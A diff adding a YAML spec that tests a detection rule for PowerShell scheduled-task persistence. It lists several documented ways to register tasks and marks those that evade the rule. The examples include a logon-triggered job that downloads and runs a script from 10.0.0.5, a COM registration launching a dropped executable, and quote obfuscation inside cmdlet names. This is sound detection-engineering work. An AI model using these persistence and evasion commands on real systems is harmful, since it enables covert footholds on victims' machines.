@@ -1,0 +1,131 @@
+# Behaviour spec: the ways PowerShell registers a scheduled task from a command line this rule reads.
+# rasd certify proves the rule fires on every event of each variant, or prints one that slips past
+# (docs/CERTIFY.md). Patterns are Python regular expressions matched in full; an argv pattern is matched
+# against the arguments the program receives, joined by NUL (\x00), after the C runtime has split the
+# command line. {i:text} is text with each ASCII letter in either case.
+behaviour: >-
+  powershell.exe or pwsh.exe registers or changes a scheduled task from its command line: the
+  ScheduledTasks cmdlets, the PSScheduledJob cmdlets, or the Task Scheduler COM object.
+
+sources:
+  - id: register-scheduledtask
+    title: Microsoft Learn, Register-ScheduledTask (ScheduledTasks module)
+    url: https://learn.microsoft.com/powershell/module/scheduledtasks/register-scheduledtask
+  - id: new-scheduledtaskaction
+    title: Microsoft Learn, New-ScheduledTaskAction (ScheduledTasks module)
+    url: https://learn.microsoft.com/powershell/module/scheduledtasks/new-scheduledtaskaction
+  - id: command-precedence
+    title: Microsoft Learn, about_Command_Precedence (module-qualified command names)
+    url: https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_command_precedence
+  - id: about-variables
+    title: Microsoft Learn, about_Variables (a variable name in braces, as in ${env:ProgramFiles(x86)})
+    url: https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_variables
+  - id: register-scheduledjob
+    title: Microsoft Learn, Register-ScheduledJob (scheduled jobs are registered in Task Scheduler under Microsoft\Windows\PowerShell\ScheduledJobs)
+    url: https://learn.microsoft.com/powershell/module/psscheduledjob/register-scheduledjob?view=powershell-5.1
+  - id: taskservice
+    title: Microsoft Learn, TaskService object (ProgID Schedule.Service)
+    url: https://learn.microsoft.com/windows/win32/taskschd/taskservice
+  - id: com-registration
+    title: Microsoft Learn, Registration Trigger Example (Scripting) - CreateObject("Schedule.Service") ... RegisterTaskDefinition
+    url: https://learn.microsoft.com/windows/win32/taskschd/registration-trigger-example--scripting-
+  - id: crt-args
+    title: Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
+    url: https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments
+  - id: dosfuscation
+    title: D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line
+    url: https://www.exploit-db.com/docs/44347
+
+define:
+  powershell: '.*\\(?:{i:powershell.exe}|{i:pwsh.exe})'
+  register: '(?:{i:Register-ScheduledTask}|{i:Set-ScheduledTask})'
+  action: '{i:New-ScheduledTaskAction}'
+  any: '[\s\S]*'
+
+variants:
+  - name: Task registered with an inline action
+    why: >-
+      The documented way to build and register a task in one command: New-ScheduledTaskAction for the
+      action [new-scheduledtaskaction], Register-ScheduledTask or Set-ScheduledTask to store it
+      [register-scheduledtask], in any letter case and order.
+    sources: [register-scheduledtask, new-scheduledtaskaction]
+    event:
+      Image: '{powershell}'
+      CommandLine: '{any}(?:{register}{any}{action}|{action}{any}{register}){any}'
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c "$a = New-ScheduledTaskAction -Execute calc.exe; Register-ScheduledTask -TaskName Updater -Action $a -Trigger (New-ScheduledTaskTrigger -AtLogOn)"'
+
+  - name: Module-qualified cmdlet names
+    why: A command can be called by its module-qualified name [command-precedence], as ScheduledTasks\Register-ScheduledTask.
+    sources: [command-precedence, register-scheduledtask]
+    event:
+      Image: '{powershell}'
+      CommandLine: '{any}{i:ScheduledTasks}\\{register}{any}{i:ScheduledTasks}\\{action}{any}'
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c "ScheduledTasks\Register-ScheduledTask -TaskName u -Action (ScheduledTasks\New-ScheduledTaskAction -Execute calc.exe)"'
+
+  - name: Environment variable in braces
+    expect: bypass
+    why: >-
+      ${env:TEMP} is the same variable as $env:TEMP: a variable name can always be written in braces
+      [about-variables]. Here the task comes from XML (Register-ScheduledTask -Xml), so no
+      New-ScheduledTaskAction appears [register-scheduledtask].
+    reason: The rule looks for the text $env:TEMP and $env:APPDATA, which the brace form does not contain.
+    fix: Match the variable names with an optional brace, as \$\{?env:(TEMP|APPDATA).
+    sources: [about-variables, register-scheduledtask]
+    event:
+      Image: '{powershell}'
+      CommandLine: {match: '{any}{i:Register-ScheduledTask}{any}\$\{{i:env}:(?:{i:TEMP}|{i:APPDATA})\}{any}', not: '{any}{action}{any}'}
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c "Register-ScheduledTask -TaskName Updater -Xml (Get-Content ${env:TEMP}\u.xml -Raw)"'
+
+  - name: Register-ScheduledJob
+    expect: bypass
+    why: >-
+      Windows PowerShell's Register-ScheduledJob registers a job in Task Scheduler, under
+      Microsoft\Windows\PowerShell\ScheduledJobs [register-scheduledjob].
+    reason: The rule knows only the ScheduledTasks cmdlets.
+    fix: Add Register-ScheduledJob to selection_register, for powershell.exe.
+    sources: [register-scheduledjob]
+    event:
+      Image: '.*\\{i:powershell.exe}'
+      CommandLine: '{any}{i:Register-ScheduledJob}{any}'
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c "Register-ScheduledJob -Name Updater -ScriptBlock { IEX (iwr http://10.0.0.5/a.ps1) } -Trigger (New-JobTrigger -AtLogOn)"'
+
+  - name: Task Scheduler COM object
+    expect: bypass
+    why: >-
+      The TaskService object (ProgID Schedule.Service) registers a task with RegisterTaskDefinition
+      [taskservice, com-registration], from any language that can create COM objects.
+    reason: The rule knows only the ScheduledTasks cmdlets.
+    fix: Add Schedule.Service with RegisterTaskDefinition on the same command line.
+    sources: [taskservice, com-registration]
+    event:
+      Image: '{powershell}'
+      CommandLine: '{any}{i:Schedule.Service}{any}{i:RegisterTaskDefinition}{any}'
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c "$s=New-Object -ComObject Schedule.Service;$s.Connect();$t=$s.NewTask(0);$a=$t.Actions.Create(0);$a.Path=''C:\Users\Public\u.exe'';$s.GetFolder(''\'').RegisterTaskDefinition(''Updater'',$t,6,$null,$null,3)"'
+
+  - name: Quoted part inside the cmdlet name
+    expect: bypass
+    why: >-
+      PowerShell reads its command from the arguments after the C runtime has split them and dropped the
+      quotes [crt-args], so Register-Sched"uled"Task on the command line runs Register-ScheduledTask;
+      such quotes change nothing at run time [dosfuscation].
+    reason: The rule looks for the cmdlet names as unbroken text in the raw command line.
+    fix: Remove the quotes from the command line before matching (a normalized field).
+    sources: [crt-args, dosfuscation, register-scheduledtask]
+    event:
+      Image: '{powershell}'
+      CommandLine:
+        argv: '(?:{token}\x00)*[^\x00]*{register}[^\x00]*(?:\x00{token})*\x00[^\x00]*{action}[^\x00]*(?:\x00{token})*'
+        match: '{any}"{any}'
+    examples:
+      - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+        CommandLine: 'powershell.exe -c Register-Sched"uled"Task -TaskName u -Action (New-ScheduledTaskAction -Execute calc.exe)'
